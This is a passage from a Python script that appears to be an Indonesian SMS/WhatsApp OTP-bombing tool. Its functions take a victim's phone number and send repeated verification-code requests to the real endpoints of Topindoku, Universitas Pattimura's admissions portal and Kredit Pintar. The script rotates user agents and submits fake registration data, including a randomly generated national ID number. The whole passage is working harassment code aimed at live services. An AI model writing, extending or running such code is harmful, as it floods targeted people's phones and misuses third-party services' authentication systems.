        res2 = r2.json()
        return res2.get("code") == "0"
    except:
        return False

def spam_otp_topindowa(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        url = "https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://mitra.topindoku.co.id"
        }
        payload = {
            "phone": phone,
            "via": "WA",
            "hash": "gruenbf12d2",
            "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_unpatti(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://mandiri.pmb.unpatti.ac.id",
            "Referer": "https://mandiri.pmb.unpatti.ac.id/register"
        }
        payload = {
            "nama": "XyTools",
            "email": "xytools@gmail.com",
            "no_telp": phone,
            "nik": str(random.randint(1000000000000000, 9999999999999999)),
            "password": "XyTools1",
            "password_confirmation": "XyTools1",
            "tanggal_lahir": "2000-01-01"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_kreditpintar(nomor):
    try:
        if nomor.startswith("0"):
            nomor_internasional = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_internasional = "+" + nomor
        elif nomor.startswith("+62"):
            nomor_internasional = nomor
        else:
            nomor_internasional = "+62" + nomor

        url = "https://go.kreditpintar.com/api/auth/send-code"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/json",
            "Origin": "https://go.kreditpintar.com"
        }
        payload = {"mobileNumber": nomor_internasional, "type": "SMS"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
